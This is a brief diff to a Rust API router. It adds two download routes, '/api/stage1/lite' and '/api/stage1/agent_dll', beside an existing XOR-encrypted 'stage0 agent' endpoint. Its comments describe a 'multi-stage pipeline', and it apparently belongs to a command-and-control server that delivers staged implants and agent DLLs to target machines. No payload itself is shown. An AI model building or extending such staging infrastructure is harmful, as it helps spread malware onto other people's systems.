@@ -65,6 +65,9 @@ pub fn create_api_router(state: Arc<ApiState>) -> Router {
         .route("/api/status", get(handlers::server_status))
         // Stage0 agent download endpoint (XOR encrypted)
         .route("/api/stage0/agent", get(handlers::download_stage0_agent))
+        // Stage1 endpoints for stage0-lite multi-stage pipeline
+        .route("/api/stage1/lite", get(handlers::download_stage0_lite))
+        .route("/api/stage1/agent_dll", get(handlers::download_agent_dll))
         .layer(cors)
         .with_state(state)
 }
